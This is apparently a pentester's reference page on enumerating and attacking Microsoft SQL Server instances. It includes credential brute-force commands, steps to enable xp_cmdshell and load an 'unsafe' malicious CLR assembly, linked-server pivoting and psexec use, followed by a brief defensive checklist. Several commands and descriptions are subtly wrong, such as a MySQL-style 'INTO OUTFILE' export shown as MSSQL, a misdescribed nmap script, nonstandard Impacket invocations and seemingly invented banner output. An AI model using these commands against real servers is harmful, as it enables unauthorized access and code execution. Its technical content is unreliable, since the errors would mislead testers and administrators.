---
title: "MSSQL Databases"
description: "Techniques and tools to discover, enumerate, and assess Microsoft SQL Server instances."
tags:
  - enumeration
  - mssql
  - footprinting
  - reconnaissance
  - nmap
  - sqlmap
  - osql
icon: material/microsoft
---

# 🟦 MSSQL Footprinting

Microsoft SQL Server (MSSQL) is a widely deployed relational database platform. Unsecured or mis‑configured instances can leak version information, user accounts, database schemas, and even allow remote code execution. This guide outlines practical reconnaissance steps, useful tools, and defensive recommendations.

---

## 1. Service Discovery

- **Port scanning** – MSSQL typically listens on TCP **1433** (default) and can also use dynamic ports. Use a quick scan to locate open ports.
  ```bash
  nmap -p 1433 --open <target>
  ```
- **Banner grabbing** – Simple TCP connection can reveal the server version. The `nc` utility works for a quick check.
  ```bash
  nc -v <target> 1433
  ```
  Expected output (truncated):
  ```
  0x01 0x0A 0x00 0x00 ... (MSSQL Server 2017 Express)
  ```
- **Nmap NSE scripts** – Several scripts target MSSQL:
  - `ms-sql-info` – Retrieves version, OS, and authentication methods.
  - `ms-sql-dac` – Enumerates available databases when credentials are known.
  ```bash
  nmap -p 1433 -sV --script ms-sql-info <target>
  ```

---

## 2. Version & Configuration Enumeration

| Tool | Description | Example |
|------|-------------|---------|
| `nmap -sV --script=ms-sql-info` | Retrieves MSSQL version, OS, and authentication methods. | `nmap -p 1433 -sV --script ms-sql-info 10.10.10.5` |
| `sqlcmd` (or `osql`) | Native Microsoft client for executing ad‑hoc SQL. | `sqlcmd -S <host> -U <user> -P <pass> -Q "SELECT @@VERSION;"` |
| `sqlmap` | Automated SQL injection tool; can pull version via the `--banner` flag when targeting web apps that talk to MSSQL. | `sqlmap -u "http://target/page.php?id=1" --banner` |
| `mssqlclient.py` (Impacket) | Python client that supports Windows authentication and interactive queries. | `python3 -m impacket.mssqlclient <host> -windows-auth` |

---

## 2.2 Default System Databases

| Database | Description |
|----------|-------------|
| master | Tracks all system information for an SQL server instance |
| model | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| msdb | The SQL Server Agent uses this database to schedule jobs & alerts |
| tempdb | Stores temporary objects |
| resource | Read‑only database containing system objects included with SQL server |

---

## 2.1 Direct MSSQL Commands (sqlcmd)

Common interactive commands using the `sqlcmd` utility:

```bash
# Show server version
sqlcmd -S <host> -U <user> -P <pass> -Q "SELECT @@VERSION;"

# List databases
sqlcmd -S <host> -U <user> -P <pass> -Q "SELECT name FROM sys.databases;"

# List tables in a specific database
sqlcmd -S <host> -d <database> -U <user> -P <pass> -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';"

# Describe a table's columns
sqlcmd -S <host> -d <database> -U <user> -P <pass> -Q "SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<table>';"

# Select sample data (limit 10 rows)
sqlcmd -S <host> -d <database> -U <user> -P <pass> -Q "SELECT TOP 10 * FROM <table>;"

# Export a table to a CSV file (server‑side) – requires write permission to the output path
sqlcmd -S <host> -d <database> -U <user> -P <pass> -Q "SELECT * FROM <table> INTO OUTFILE 'C:\\temp\\<table>.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '\"' LINES TERMINATED BY '\n';"
```


!!! tip
    Use the `-h -1` flag (`-h -1` in `sqlcmd`) to suppress column headers when scripting.

---

## 3. Credential Brute‑Force

- **Hydra** – Parallel password guessing against MSSQL.
  ```bash
  hydra -L users.txt -P pass.txt mssql://<target>
  ```
- **Ncrack** – Faster for large wordlists.
  ```bash
  ncrack -p 1433 <target> -U users.txt -P pass.txt
  ```
- **Metasploit** – `auxiliary/scanner/mssql/mssql_login` module supports credential attacks and can dump hashes.
  ```bash
  msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS <target>; set USER_FILE users.txt; set PASS_FILE pass.txt; run"
  ```

---

## 4. Database & User Enumeration

| Tool | NSE Script / Command | Example |
|------|----------------------|---------|
| `nmap --script ms-sql-dac` | Enumerates databases when a valid login is supplied via `--script-args`. | `nmap -p 1433 --script ms-sql-dac --script-args mssqldb.user=sa,mssqldb.pass=Password123 <target>` |
| `sqlmap --dbs` | Lists databases after a successful injection. | `sqlmap -u http://site.com/page.php?id=1 --dbs` |
| `mssqlclient.py` | Interactive enumeration of users, roles, and linked servers. | `python3 -m impacket.mssqlclient <host> -username sa -password <pass>` |
| `sqlcmd -Q "SELECT name FROM sys.server_principals;"` | Lists server principals (users and logins). |

---

## 5. Privilege Escalation & Lateral Movement

1. **xp_cmdshell** – If enabled, allows execution of OS commands.
   ```sql
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami';
   ```
2. **CLR integration** – Upload and execute a .NET assembly.
   ```sql
   EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
   CREATE ASSEMBLY Malicious FROM 'C:\temp\malicious.dll' WITH PERMISSION_SET = UNSAFE;
   ```
3. **Linked servers** – Pivot to other hosts if a linked server is trusted.
   ```sql
   EXEC sp_linkedservers; -- list linked servers
   EXEC ('SELECT @@VERSION') AT [LinkedServerName];
   ```
4. **Impacket `psexec.py`** – Use valid MSSQL credentials to execute remote commands via the `xp_cmdshell` or SMB relay.
   ```bash
   python3 -m impacket.psexec <target> -user <user> -password <pass>
   ```

---

## 6. Defensive Recommendations (Quick Checklist)

- Disable **sa** account or enforce a strong, complex password.
- Turn off **xp_cmdshell** and **CLR** unless required.
- Restrict inbound traffic to port **1433** (or custom ports) using firewalls.
- Require encrypted connections (`Encrypt=yes` in connection strings).
- Apply the latest cumulative updates and patches.
- Use **Windows Authentication** (Active Directory) where possible.
- Regularly audit server logs for failed login attempts.

---

## 7. References & Further Reading

- Microsoft Docs – Security Best Practices for SQL Server: https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-server-security-best-practices
- Nmap MSSQL NSE scripts: https://nmap.org/nsedoc/scripts/ms-sql-*.html
- Impacket MSSQL client documentation: https://github.com/SecureAuthCorp/impacket/tree/master/examples
- OWASP Testing Guide – Database Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Testing_for_Configuration_and_Deployment_Management
- sqlmap Project: https://github.com/sqlmapproject/sqlmap

---


!!! warning
    *All commands should be executed only against systems you own or have explicit permission to test. Unauthorized probing of MSSQL services is illegal and may trigger security alerts.*
